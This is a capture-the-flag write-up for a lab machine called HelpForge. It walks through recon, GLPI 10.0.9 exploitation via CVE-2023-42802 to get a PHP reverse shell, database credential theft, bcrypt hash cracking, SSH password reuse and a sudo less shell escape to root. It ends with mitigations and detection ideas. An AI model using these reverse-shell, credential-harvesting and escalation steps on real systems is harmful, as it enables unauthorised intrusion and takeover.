# HelpForge CTF - Writeup

**Author**: Luca  
**Date**: 2026-05-21  
**Difficulty**: Easy-Medium  
**Target IP**: `192.168.56.102`  
**Time spent**: ~20 minutes with the intended path known; several hours for a blind solve depending on prior GLPI/CVE and Linux privilege-escalation knowledge  
**Status**: Final, manual validation completed

---

## Overview

HelpForge is an Ubuntu 22.04 CTF machine themed as an abandoned ByteWise
Solutions helpdesk server. The exposed attack surface consists of FTP, SSH, and
HTTP. The intended path is GLPI exploitation for initial access as `www-data`,
credential discovery from the GLPI configuration and database, password reuse
to SSH as `techops`, and privilege escalation through a misconfigured `sudo`
rule for `less`.

High-level attack chain:

```text
nmap -> FTP rabbit hole -> GLPI 10.0.9 -> CVE-2023-42802 RCE
     -> www-data -> config_db.php -> MySQL glpi_users hash
     -> crack techops password -> SSH as techops -> sudo less -> root
```

---

## Reconnaissance

### Nmap Scan

**Goal**: Identify externally reachable services and version hints.

**Command**:

```bash
nmap -sV -p21,22,80,3306 192.168.56.102
```

**Output**:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-21 02:10 CEST
Nmap scan report for 192.168.56.102
Host is up (0.00038s latency).

PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 2.0.8 or later
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.14 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    Apache httpd
3306/tcp filtered mysql
Service Info: Host: ByteWise; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Interpretation**:

- FTP is exposed and allows investigation of file-drop artifacts.
- SSH is exposed but requires credentials.
- HTTP is the primary attack surface.
- MySQL is not externally reachable, which prevents direct database access.
- Apache hides detailed version information, but the host exposes enough web
  application metadata to continue.

**Decision**: Investigate HTTP/GLPI first, but enumerate FTP because anonymous
FTP is a common source of credentials or hints.

---

## Enumeration

### HTTP / GLPI Fingerprinting

**Goal**: Confirm the web application and version.

**Command**:

```bash
curl -I http://192.168.56.102/
```

**Output**:

```text
HTTP/1.1 200 OK
Date: Thu, 21 May 2026 00:10:39 GMT
Server: Apache
Set-Cookie: glpi_227c0c4df287db20311ad5c2ddf179df=...; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-HelpForge-Build: GLPI-10.0.9
Content-Type: text/html; charset=UTF-8
```

**Interpretation**:

- The `glpi_*` cookie confirms GLPI.
- `X-HelpForge-Build: GLPI-10.0.9` reveals the exact intended version.
- GLPI 10.0.9 is a useful research target for known vulnerabilities.

**Research result**: GLPI 10.0.9 is vulnerable to the intended
`CVE-2023-42802` attack path in this challenge configuration.

### FTP Enumeration (Rabbit Hole)

**Goal**: Determine whether anonymous FTP provides credentials, files, or hints.

**Command**:

```bash
ftp 192.168.56.102
```

Login:

```text
anonymous
anonymous
```

FTP commands:

```text
ls -la
get README.txt
get .old_creds.bak
get client_logs_2024.tar.gz
bye
```

**Downloaded files**:

```text
README.txt
.old_creds.bak
client_logs_2024.tar.gz
```

**Relevant contents**:

```bash
cat .old_creds.bak
```

```text
# Backup of expired technician credentials, do NOT use
m.keller:OldHelpdesk2023
```

**Wordlist extraction**:

```bash
tar -xzf client_logs_2024.tar.gz
wc -l client_logs_2024/helpforge_wordlist.txt
grep -n '^TechOps_HelpForge24$' client_logs_2024/helpforge_wordlist.txt
```

**Output**:

```text
789 client_logs_2024/helpforge_wordlist.txt
62:TechOps_HelpForge24
```

The embedded wordlist is intentionally larger than a direct hint list. It mixes
common password candidates with HelpForge/ByteWise-specific mutations, while
still keeping the intended password crackable in a reasonable time.

**Dead-end validation**:

```bash
ssh m.keller@192.168.56.102
```

**Expected result**: login fails because `m.keller` is an expired decoy
credential and does not exist as a valid account.

**Conclusion**: FTP does not provide direct access. It provides narrative
context, a decoy credential, and the intended cracking wordlist.

---

## Foothold

### Exploiting GLPI 10.0.9

**Goal**: Obtain code execution through the intended GLPI vulnerability path.

**Vulnerability**: `CVE-2023-42802`, exercised against the GLPI 10.0.9
installation.

The hardest part of the manual exploitation was weaponizing the public PoC into
a reliable reverse-shell exploit. The files used for this were:

- `rce.py`: adapted PoC that retrieves a GLPI CSRF token, uploads a payload, and
  triggers it.
- `shell.php.old`: PHP reverse shell payload configured to connect back to the
  attacker host.

The payload callback was configured in `shell.php.old`:

```php
$sh = new Shell('192.168.56.1', 4444);
```

Start the listener on the attacker host before triggering the exploit:

```bash
nc -lvnp 4444
```

Then execute the PoC against the target:

```bash
python3 rce.py http://192.168.56.102
```

The adapted PoC performs the following steps:

1. Requests `/index.php` and extracts the GLPI CSRF token.
2. Reads the local payload file, using `shell.php.old` in the submitted
   repository.
3. Uploads the payload as `file.png` through `/front/device.form.php`.
4. Requests `/front/files/file.png`, which triggers the uploaded PHP payload and
   opens the reverse shell.

**Expected quick verification after the shell connects**:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Listener output**:

```text
listening on [any] 4444 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 37984
SOCKET: Shell has connected! PID: 21821
```

### Shell Stabilization

The initial reverse shell is limited. Stabilize it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press `Ctrl+Z`, then on the attacker host:

```bash
stty raw -echo; fg
```

Back in the shell:

```bash
export TERM=xterm
stty rows 40 cols 120
```

**Situational awareness**:

```bash
whoami
id
hostname
pwd
```

**Output**:

```text
whoami
www-data

hostname
helpforge

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

pwd
/var/www/glpi/front/files
```

**Interpretation**: The exploit gives a low-privilege Apache/GLPI service
account. This is enough to read GLPI application files but not enough to read
the user or root flags.

---

## User Access

### User Enumeration

**Goal**: Identify realistic target users for lateral movement.

**Command**:

```bash
cat /etc/passwd | grep -E 'bash$'
```

**Expected notable users**:

```text
root:x:0:0:root:/root:/bin/bash
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
techops:x:1002:1002:HelpForge Technician:/home/techops:/bin/bash
```

**Interpretation**:

- `root` is the final target.
- `vagrant` is a provisioning artifact and should not be part of the player path.
- `techops` is the custom challenge user and likely holds `user.txt`.

### Credential Discovery

**Goal**: Find application credentials in GLPI configuration files.

**Command**:

```bash
cat /var/www/glpi/config/config_db.php
```

**Output**:

```php
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpiuser';
   public $dbpassword = 'HelpForge_DB_Backend_2024%21';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

**Interpretation**:

The password is URL-encoded in the GLPI config. `%21` decodes to `!`, so the
actual database password is:

```text
HelpForge_DB_Backend_2024!
```

### Database Enumeration

**Goal**: Retrieve the `techops` GLPI password hash.

**Command**:

```bash
mysql -u glpiuser -p'HelpForge_DB_Backend_2024!' glpidb
```

**Connection output**:

```text
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 97
Server version: 8.0.45-0ubuntu0.22.04.1 (Ubuntu)
```

Inside MySQL:

```sql
SELECT name,password FROM glpi_users WHERE name='techops';
exit
```

**Output**:

```text
+---------+--------------------------------------------------------------+
| name    | password                                                     |
+---------+--------------------------------------------------------------+
| techops | $2y$10$WPXEArLrArPp9atPVYZKMOQAHfZwkC8Bl7HGeo5PwdQUszXP709y6 |
+---------+--------------------------------------------------------------+
1 row in set (0.00 sec)
```

**Interpretation**:

The `techops` GLPI account is stored with a bcrypt hash. Because the challenge
intentionally reuses the same password for GLPI and Linux SSH, cracking this
hash should provide SSH access.

### Hash Cracking

**Hash format**: bcrypt  
**Hashcat mode**: `-m 3200`

Save the hash:

```bash
echo '$2y$10$WPXEArLrArPp9atPVYZKMOQAHfZwkC8Bl7HGeo5PwdQUszXP709y6' > techops.hash
```

Crack with the FTP wordlist:

```bash
hashcat -m 3200 techops.hash client_logs_2024/helpforge_wordlist.txt
hashcat -m 3200 techops.hash client_logs_2024/helpforge_wordlist.txt --show
```

Expected result:

```text
TechOps_HelpForge24
```

**Output**:

```text
$2y$10$WPXEArLrArPp9atPVYZKMOQAHfZwkC8Bl7HGeo5PwdQUszXP709y6:TechOps_HelpForge24
```

### SSH Login

**Command**:

```bash
ssh techops@192.168.56.102
```

Password:

```text
TechOps_HelpForge24
```

**User flag**:

```bash
cat /home/techops/user.txt
```

Output:

```text
FLAG{917b43b3f6ec820a25ed2cb465426259}
```

**Interpretation**:

This confirms password reuse between GLPI and the Linux account.

---

## Privilege Escalation

### Enumeration

The first privilege escalation check after getting a real user shell:

```bash
sudo -l
```

Expected output:

```text
Matching Defaults entries for techops on helpforge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User techops may run the following commands on helpforge:
    (root) NOPASSWD: /usr/bin/less /var/log/glpi/helpforge.log
```

**Interpretation**:

`techops` can run `less` as root on a specific GLPI log file without a
password. `less` is interactive and supports shell escapes, which makes this a
privilege escalation vector.

### Exploitation (GTFOBins: less)

Run the allowed command:

```bash
sudo /usr/bin/less /var/log/glpi/helpforge.log
```

Inside `less`, type:

```text
!/bin/bash
```

Confirm root:

```bash
id
```

Output:

```text
uid=0(root)
```

**Root flag**:

```bash
cat /root/root.txt
```

Output:

```text
FLAG{d5a31615c10bb7671aa2f4bbbd161f05}
```

---

## Summary

**Flags captured**: 2/2  
**Total time**: ~1 day including VM provisioning, Vagrant/VirtualBox troubleshooting, Ansible automation, exploit weaponization, validation, and documentation  
**Difficulty assessment**: Easy-Medium

### Attack Timeline

| Step | Action | Result | MITRE ATT&CK |
|---|---|---|---|
| 1 | `nmap -sV` | FTP, SSH, HTTP exposed; MySQL filtered | T1046 |
| 2 | HTTP fingerprinting | GLPI 10.0.9 identified | T1595 |
| 3 | FTP anonymous enumeration | Decoy creds and wordlist found | T1083 |
| 4 | GLPI CVE exploitation | Shell as `www-data` | T1190, T1505.003 |
| 5 | Read `config_db.php` | GLPI DB credentials found | T1552.001 |
| 6 | Query `glpi_users` | `techops` bcrypt hash extracted | T1005 |
| 7 | Offline cracking | Password `TechOps_HelpForge24` recovered | offline |
| 8 | SSH password reuse | Shell as `techops`, user flag | T1078 |
| 9 | `sudo -l` | `less` NOPASSWD rule found | T1069.001 |
| 10 | `sudo less` shell escape | Root shell and root flag | T1548.003 |

### Key Vulnerabilities

1. **GLPI 10.0.9 vulnerable attack path**  
   The outdated GLPI deployment enables the intended CVE-based initial access.
   Mitigation: upgrade GLPI and validate secure deployment layout.

2. **Application configuration credential exposure**  
   GLPI stores database credentials in `config_db.php`. Once the web process is
   compromised, the attacker can read them. Mitigation: reduce filesystem
   exposure, protect application secrets, and monitor sensitive file access.

3. **Password reuse between GLPI and Linux**  
   The cracked GLPI password also works for SSH as `techops`. Mitigation:
   enforce unique credentials per service and rotate passwords after
   compromise.

4. **Misconfigured sudo rule for an interactive pager**  
   `less` can spawn a shell through `!/bin/bash`. Mitigation: avoid granting
   `sudo` rights to interactive programs, use safer log-review tooling, or add
   strict controls such as `NOEXEC` where appropriate.

### Detection Opportunities

- FTP anonymous login and download activity in `vsftpd.log`.
- GLPI exploit requests in Apache access logs.
- Read access to `/var/www/glpi/config/config_db.php`.
- MySQL query activity against `glpi_users`.
- SSH login for `techops` after web exploitation.
- `sudo` execution of `/usr/bin/less /var/log/glpi/helpforge.log`.

### Lessons Learned

- Weaponizing `CVE-2023-42802` took the longest. The PoC had to be adapted so
  that it uploaded and triggered the PHP payload instead of only proving code
  execution.
- The least obvious part was the GLPI upload flow: the PHP payload is uploaded
  as `file.png` and then executed through `/front/files/file.png`.
- No unintended shortcut was found during manual validation. MySQL was filtered
  externally, the FTP credential was only a decoy, and the intended path still
  required web exploitation, database access, hash cracking, SSH login, and
  sudo abuse.
- A future improvement would be to keep private builder notes about the PoC
  weaponization steps, while keeping the player-facing hints minimal. The
  larger mixed wordlist is a better balance than the original very short list.
